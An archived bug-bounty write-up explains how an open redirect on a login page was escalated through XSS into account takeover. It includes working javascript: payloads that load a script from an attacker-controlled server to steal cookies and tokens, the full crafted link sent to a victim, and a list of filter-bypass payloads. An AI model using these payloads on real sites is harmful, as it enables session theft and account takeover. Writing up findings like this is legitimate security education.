# How I Leveraged Open Redirect to Account Takeover

- **Source URL:** https://medium.com/@abdelrahman0x01/how-i-leveraged-open-redirect-to-account-takeover-b0ff213d23dc?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240923045125/https://medium.com/@abdelrahman0x01/how-i-leveraged-open-redirect-to-account-takeover-b0ff213d23dc?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7342 (id 7342)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Leveraged Open Redirect to Account Takeover

# Description

During a pentesting engagement at [CyberAR](https://web.archive.org/web/20240923045125/https://medium.com/u/d764844684c5?source=post_page-----b0ff213d23dc--------------------------------), I discovered an open redirect vulnerability on the login page that I was able to escalate to an account takeover. In this write-up, I’ll explain how I achieved this.

# Exploit Begins

While exploring the website, I noticed a redirect parameter on the login page. I will also explain how to quickly identify open redirect vulnerabilities in the tips below, For example, the URL looked like this: **https://target.com/auth/signin?redirect=****Javascript:alert(1)**

Next, I opened the browser developer tools and checked the storage tab for the HTTP-only flag, which prevents JavaScript from accessing cookies. I observed that all parameters had the HTTP-only flag set to false.

I then attempted to inject the following blind XSS payload:

`javascript:eval('var a=document.createElement(\'script\');a.src=\'https://<YOUR-SERVER>\';document.body.appendChild(a)')`
and monitored the network tab. Unfortunately, I noticed that requests with the server name containing the blind XSS payload did not appear in the network requests. After trying another blind XSS payload,

`JavaScript://%250A/?%27/\%27/%22/\%22/*//%26apos;)/%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\\74k%3CK/contentEditable/autoFocus/OnFocus=/${/*/;{/**/(import(/https:\\<YOUR-SERVER>.pipedream.net/.source))}//\\76--%3E`
I observed that the request containing my server name appeared in the network tab

and successfully received a callback on my server.

and With this crafted `URL`

``https://target.com/auth/signin?redirect=JavaScript://%250A/*?%27/*\%27/*%22/*\%22/*`/*\`/*%26apos;)/*%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\74k%3CK/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\<YOUR-SERVER>.pipedream.net/.source))}//\76--%3E``
I was able to send it to the victim and steal the cookies and token, which allowed me to successfully log into the account.

# Tips

1. Always test for XSS if you find an open redirect vulnerability.
2. To quickly identify an open redirect, try logging into your account, accessing any endpoint, copying the URL, and pasting it into a private window. This may reveal redirect parameters for testing. by *Khalid Hassan*
3. You might also find redirect parameter by clicking on the sign-out and testing for open redirect vulnerabilities there.
4. If XSS does not trigger in redirect parameters, try injecting the following payloads:

```
Javascript:alert`1`
Javascript:[alert][0].call(this,1)
Javascript://%250Aalert(1)
javascript://https://domain.com/%250A1?alert(1):0 
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
```
# Summary

In this write-up, I detailed how an open redirect vulnerability on a login page was leveraged to achieve an account takeover by combining it with XSS and cookie theft techniques. I also provided tips for identifying and exploiting similar vulnerabilities.

*Thanks for reading.*
